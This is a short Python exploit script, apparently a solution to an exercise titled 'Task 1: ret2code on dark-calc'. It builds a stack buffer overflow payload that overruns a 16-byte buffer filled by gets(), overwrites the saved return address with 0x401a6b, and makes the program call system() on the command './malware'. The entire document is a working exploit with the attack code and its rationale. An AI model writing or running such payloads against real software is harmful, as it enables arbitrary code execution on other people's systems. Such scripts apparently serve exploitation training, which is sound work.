#!/usr/bin/env python3
"""Task 1: ret2code on dark-calc.

The 16-byte `expression` buffer is overrun by gets().  We overwrite the
saved return address with the address of the instruction sequence in
eval() that calls system(command_buf) directly (0x401a6b).  The leading
bytes of the payload are a NUL-terminated command string; strcpy() copies
just that string into the global command_buf before input() returns.
"""
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)

payload  = b"./malware\x00"        # becomes command_buf
payload += b"A" * (24 - len(payload))  # 16-byte buffer + 8-byte saved rbp
payload += p64(0x401A6B)           # mov edi, command_buf; call system@plt

sys.stdout.buffer.write(payload)
